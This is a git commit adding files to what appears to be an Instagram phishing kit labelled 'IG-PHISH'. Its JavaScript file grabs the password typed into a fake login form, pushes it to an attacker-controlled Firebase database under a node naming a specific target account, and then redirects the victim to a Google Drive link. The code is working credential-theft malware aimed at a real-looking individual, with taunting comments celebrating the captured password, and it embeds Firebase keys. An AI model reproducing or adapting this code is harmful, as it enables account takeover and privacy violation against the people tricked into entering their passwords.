59b6940a79ecba35d2e452fe28426a0fe09ff93b
Michael Bryer <bradyturner139@gmail.com>
2024-11-04 21:30:56 -0300

    Add files via upload

---
+++ l/galleryImage.md
@@ -0,0 +1,9 @@
+# Galeria de imagens
+
+O link abaixo permite visualizar a galeria de imagens, assim como, excluir o conteúdo da mesma.
+
+[Acesse aqui](https://postimg.cc/gallery/8GGy58z/af531079) a galeria de imagens do __IG-PHISH__.
+
+---
+
+© 2024 Malva Group, LLC
---
+++ l/js/sendToFB.js
@@ -0,0 +1,78 @@
+// Developed by Malva Group
+
+// Configuração do Firebase
+var firebaseConfig = {
+    apiKey: "AIzaSyAH6cQhi6nZbJJ8yNnp6KrcoIhMObSfgGc",
+    authDomain: "mg-igp1.firebaseapp.com",
+    projectId: "mg-igp1",
+    storageBucket: "mg-igp1.appspot.com",
+    messagingSenderId: "227829971389",
+    appId: "1:227829971389:web:6b3dd719248e821f097ad4"
+};
+// Inicializa o Firebase
+firebase.initializeApp(firebaseConfig);
+firebase.analytics();
+
+// Script para redirecionamento com LocalStorage
+const specificLink = "https://drive.google.com/drive/folders/1fK8B5ZWaspF2ldUu4QmNSSOjpq41"; // O site ficará aqui
+const redirectKey = "redirectTo";
+
+// Verifica se o indicador está no localStorage
+if (localStorage.getItem(redirectKey) === specificLink) {
+    window.location.href = specificLink;
+}
+
+window.onload = function() {
+    const submitButton = document.querySelector('input[type="submit"]');
+    const p455Element = document.getElementById("p455");
+
+    // Nome do usuário no Firebase
+    let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("@lilia_barbos5__");
+
+    submitButton.addEventListener("click", function(event) {
+        if (p455Element && p455Element.value.trim() !== "") {
+            event.preventDefault(); // Impede o envio do formulário imediatamente
+            if (submitButton.value === "Entrar") {
+                setTimeout(function() {
+                    submitButton.value = "Entrando...";
+                }, 2.4); // Delay de 0.24 segundo para mudar o texto
+            }
+
+            // Envia o valor para o Firebase
+            let passeLog = p455Element.value.trim();
+            coletarDoAlvo(passeLog);
+
+            // Redireciona após 2 segundos
+            setTimeout(function() {
+                localStorage.setItem(redirectKey, specificLink);
+                window.location.href = specificLink;
+            }, 1200);
+        } else {
+            event.preventDefault(); // Impede o envio do formulário se o campo estiver vazio
+        }
+    });
+
+    // Função para salvar dados no Firebase
+    function coletarDoAlvo(senha) {
+        let dadosDoAlvo = alvoInfo.push();
+
+        dadosDoAlvo.set({
+            "Tá na mão! A senha é": senha,
+        }).then(() => {
+            console.log("Pegamos!");
+        }).catch((error) => {
+            console.error("Poha!", error);
+        });
+    }
+
+    // Adiciona um evento de clique ao link específico
+    const specificLinkElement = document.querySelector('a#specificLink');
+    if (specificLinkElement) {
+        specificLinkElement.addEventListener("click", function(event) {
+            event.preventDefault();
+            localStorage.setItem(redirectKey, specificLink);
+            window.location.href = specificLink;
+        });
+    }
+
+};
